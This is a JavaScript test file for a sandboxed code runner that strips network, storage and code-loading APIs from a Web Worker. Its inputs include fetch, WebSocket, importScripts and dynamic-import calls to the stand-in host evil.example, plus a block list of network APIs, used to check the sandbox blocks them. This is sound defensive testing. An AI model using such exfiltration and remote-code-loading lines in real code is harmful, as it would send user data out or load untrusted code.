/**
 * code-runner.test.mjs — isolated code execution contract (no DOM).
 *
 * The browser Worker API does not exist in node, so runUserCode takes an
 * injectable worker factory; fakes below simulate success, runtime
 * errors, hangs (timeout), and worker-level errors. The security
 * mechanism itself (hardened worker source) is verified by inspecting
 * the generated source: blocked globals must be removed and no DOM or
 * storage access may appear.
 */
import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import vm from 'node:vm';
import {
  RUN_TIMEOUT_MS,
  applyWorkerHardening,
  buildWorkerSource,
  isRunnableLanguage,
  rejectsDynamicImport,
  runUserCode,
} from '../src/lib/codeRunner.js';

function fakeWorkerFactory(behavior) {
  const calls = { terminate: 0, postMessage: 0, added: [], removed: [] };
  const handlers = {};
  const fire = (type, event) => {
    if (typeof handlers[type] === 'function') handlers[type](event);
  };
  const worker = {
    postMessage: (msg) => {
      calls.postMessage += 1;
      behavior(msg, fire);
    },
    terminate: () => {
      calls.terminate += 1;
    },
    addEventListener: (type, fn) => {
      calls.added.push(type);
      handlers[type] = fn;
    },
    removeEventListener: (type, fn) => {
      calls.removed.push(type);
      if (handlers[type] === fn) delete handlers[type];
    },
  };
  return {
    calls,
    createWorker: () => ({
      worker,
      cleanup: () => {
        worker.terminate();
      },
    }),
  };
}

describe('isRunnableLanguage', () => {
  it('runs JavaScript only (TypeScript is honestly rejected)', () => {
    assert.equal(isRunnableLanguage('javascript'), true);
    assert.equal(isRunnableLanguage('JavaScript'), true);
    assert.equal(isRunnableLanguage('typescript'), false);
    assert.equal(isRunnableLanguage('python'), false);
    assert.equal(isRunnableLanguage(''), false);
    assert.equal(isRunnableLanguage(null), false);
    assert.equal(isRunnableLanguage(undefined), false);
  });
});

describe('buildWorkerSource', () => {
  it('removes network, storage, and code-loading globals', () => {
    const source = buildWorkerSource('console.log(1)');
    for (const name of [
      'fetch',
      'XMLHttpRequest',
      'WebSocket',
      'EventSource',
      'importScripts',
      'indexedDB',
      'caches',
      'WebAssembly',
      'Worker',
      'SharedWorker',
      'Notification',
      'BroadcastChannel',
    ]) {
      assert.ok(source.includes(`'${name}'`), `blocked list must name ${name}`);
    }
    assert.ok(source.includes('defineProperty'), 'shadowing fallback must be present');
  });

  it('contains no DOM or application-storage access', () => {
    const source = buildWorkerSource('console.log(1)');
    assert.ok(!source.includes('document'), 'no document access');
    assert.ok(!source.includes('localStorage'), 'no localStorage access');
    assert.ok(!source.includes('sessionStorage'), 'no sessionStorage access');
    assert.ok(!source.includes('window.'), 'no window access');
  });

  it('embeds user code safely as a JSON string', () => {
    const source = buildWorkerSource('console.log("hi"); // </script>');
    assert.ok(source.includes(JSON.stringify('console.log("hi"); // </script>')));
  });

  it('embeds the same hardening function the tests exercise (no drift)', () => {
    const source = buildWorkerSource('1');
    assert.ok(source.includes(applyWorkerHardening.toString().slice(0, 80)));
  });
});

describe('rejectsDynamicImport', () => {
  it('rejects real dynamic imports including obfuscated spacing', () => {
    for (const code of [
      'import("https://evil.example/x.js")',
      "await import('https://evil.example/x.js')",
      'const m = await import\n("x")',
      'import /**/ ("x")',
      'import/*c*/("x")',
      'x = import ("x")',
      'f(`${await import("x")}`)',
    ]) {
      assert.equal(rejectsDynamicImport(code), true, code);
    }
  });

  it('allows strings, comments, static imports, and lookalikes', () => {
    for (const code of [
      'const s = "import(";',
      "const s = 'import(\"x\")';",
      '// import("x")\nconst a = 1;',
      '/* import("x") */ const a = 1;',
      '`text import( text`',
      'import x from "y";',
      'import * as ns from "y";',
      'import.meta.url;',
      'important(',
      'const re = /ab+c/;',
      '',
      null,
    ]) {
      assert.equal(rejectsDynamicImport(code), false, String(code));
    }
  });
});

describe('applyWorkerHardening (behavioral, vm-backed)', () => {
  function workerLikeGlobal() {
    const network = () => {
      throw new Error('network must be unreachable');
    };
    const proto = {};
    Object.defineProperty(proto, 'fetch', { get: () => network, configurable: true });
    proto.WebSocket = function WebSocket() {
      throw new Error('network must be unreachable');
    };
    proto.XMLHttpRequest = function XMLHttpRequest() {
      throw new Error('network must be unreachable');
    };
    proto.eval = (x) => x;
    const scope = Object.create(proto);
    scope.Function = function Function() {
      throw new Error('no string constructor');
    };
    scope.importScripts = () => {
      throw new Error('no script loading');
    };
    scope.WebAssembly = {};
    scope.Worker = function Worker() {};
    scope.navigator = {
      sendBeacon: () => true,
      serviceWorker: {},
      locks: {},
      storage: {},
      clipboard: {},
    };
    scope.console = { log() {}, error() {}, warn() {} };
    scope.postMessage = () => {};
    scope.self = scope;
    return { scope, proto };
  }

  it('neutralizes own, proto-chain, and navigator APIs', () => {
    const { scope, proto } = workerLikeGlobal();
    const neutralized = applyWorkerHardening(scope);
    assert.ok(neutralized.length > 0);
    assert.equal(scope.fetch, undefined);
    assert.equal(Object.getPrototypeOf(scope).fetch, undefined);
    assert.equal(proto.fetch, undefined);
    assert.equal(scope.WebSocket, undefined);
    assert.equal(scope.XMLHttpRequest, undefined);
    assert.equal(scope.eval, undefined);
    assert.equal(scope.Function, undefined);
    assert.equal(scope.importScripts, undefined);
    assert.equal(scope.WebAssembly, undefined);
    assert.equal(scope.Worker, undefined);
    assert.equal(scope.navigator.sendBeacon, undefined);
    assert.equal(scope.navigator.serviceWorker, undefined);
    assert.equal(scope.navigator.locks, undefined);
    assert.equal(scope.navigator.storage, undefined);
    assert.equal(scope.navigator.clipboard, undefined);
  });

  it('attack snippets throw inside a hardened context', () => {
    const { scope } = workerLikeGlobal();
    applyWorkerHardening(scope);
    const ctx = vm.createContext(scope);
    // NOTE: vm-realm errors fail cross-realm `instanceof`, so assert on
    // the error name (realm-safe) instead of the constructor.
    const throwsNamed = (fn, snippet) => {
      try {
        fn();
      } catch (err) {
        assert.ok(
          err && (err.name === 'TypeError' || err.name === 'ReferenceError'),
          `${snippet} threw ${err && err.name}`,
        );
        return;
      }
      assert.fail(`${snippet} did not throw`);
    };
    for (const snippet of [
      'fetch("https://evil.example/x")',
      'Object.getPrototypeOf(self).fetch("https://evil.example/x")',
      'eval("1+1")',
      'Function("return 1")',
      'new WebSocket("wss://evil.example/x")',
      'new XMLHttpRequest()',
      'navigator.sendBeacon("/x")',
      'importScripts("https://evil.example/x.js")',
    ]) {
      throwsNamed(() => vm.runInContext(snippet, ctx), snippet);
    }
  });

  it('legitimate code keeps working in a hardened context', () => {
    const { scope } = workerLikeGlobal();
    applyWorkerHardening(scope);
    const ctx = vm.createContext(scope);
    assert.equal(vm.runInContext('1 + 2', ctx), 3);
    assert.equal(vm.runInContext('Math.max(1, 2)', ctx), 2);
    assert.deepEqual([...vm.runInContext('Object.keys({ a: 1 })', ctx)], ['a']);
    assert.equal(vm.runInContext('JSON.stringify({ a: 1 })', ctx), '{"a":1}');
    assert.equal(vm.runInContext('typeof setTimeout', ctx), 'undefined');
  });

  it('the shipped worker source behaves end-to-end in a fake worker global', async () => {
    const posted = [];
    const scope = {
      console: { log() {}, error() {}, warn() {} },
      postMessage: (msg) => {
        posted.push(msg);
      },
    };
    scope.self = scope;
    const ctx = vm.createContext(scope);
    vm.runInContext(buildWorkerSource('console.log("hi")'), ctx);
    await scope.onmessage({ data: {} });
    assert.equal(posted.length, 1);
    assert.equal(posted[0].ok, true);
    assert.equal(posted[0].output, 'hi');
  });

  it('the shipped worker source turns network attacks into errors, not sends', async () => {
    const posted = [];
    const scope = {
      console: { log() {}, error() {}, warn() {} },
      postMessage: (msg) => {
        posted.push(msg);
      },
    };
    scope.self = scope;
    const ctx = vm.createContext(scope);
    vm.runInContext(buildWorkerSource('fetch("https://evil.example/x")'), ctx);
    await scope.onmessage({ data: {} });
    assert.equal(posted.length, 1);
    assert.equal(posted[0].ok, false);
    assert.ok(/Error:/.test(posted[0].output));
  });
});

describe('runUserCode', () => {
  it('resolves with worker output and always terminates', async () => {
    const fake = fakeWorkerFactory((msg, fire) => {
      assert.deepEqual(msg, { code: 'console.log(1)' });
      fire('message', { data: { ok: true, output: '1' } });
    });
    const output = await runUserCode('console.log(1)', { createWorker: fake.createWorker });
    assert.equal(output, '1');
    assert.equal(fake.calls.terminate, 1);
    assert.ok(fake.calls.removed.includes('message'));
    assert.ok(fake.calls.removed.includes('error'));
  });

  it('rejects with runtime errors and terminates', async () => {
    const fake = fakeWorkerFactory((msg, fire) => {
      fire('message', { data: { ok: false, output: 'Error: boom' } });
    });
    await assert.rejects(runUserCode('throw new Error(1)', { createWorker: fake.createWorker }), /boom/);
    assert.equal(fake.calls.terminate, 1);
  });

  it('terminates hung execution after the timeout', async () => {
    const fake = fakeWorkerFactory(() => {
      // Never responds — simulates an infinite loop.
    });
    await assert.rejects(runUserCode('while(true){}', { timeout: 30, createWorker: fake.createWorker }), /timed out after 30 ms/);
    assert.equal(fake.calls.terminate, 1);
  });

  it('rejects worker-level errors and terminates', async () => {
    const fake = fakeWorkerFactory((msg, fire) => {
      fire('error', new Error('spawn failed'));
    });
    await assert.rejects(runUserCode('1', { createWorker: fake.createWorker }), /Worker error/);
    assert.equal(fake.calls.terminate, 1);
  });

  it('rejects when no worker can be created (execution stays safe)', async () => {
    await assert.rejects(
      runUserCode('1', {
        createWorker: () => {
          throw new Error('Worker is not defined');
        },
      }),
      /unavailable/,
    );
    await assert.rejects(runUserCode('1', { createWorker: () => ({}) }), /unavailable/);
  });

  it('coerces non-string input instead of throwing', async () => {
    const fake = fakeWorkerFactory((msg, fire) => {
      assert.deepEqual(msg, { code: '' });
      fire('message', { data: { ok: true, output: 'Program executed successfully (no output).' } });
    });
    const output = await runUserCode(null, { createWorker: fake.createWorker });
    assert.ok(output.length > 0);
  });

  it('exports a sane positive default timeout', () => {
    assert.ok(Number.isFinite(RUN_TIMEOUT_MS) && RUN_TIMEOUT_MS > 0);
  });
});
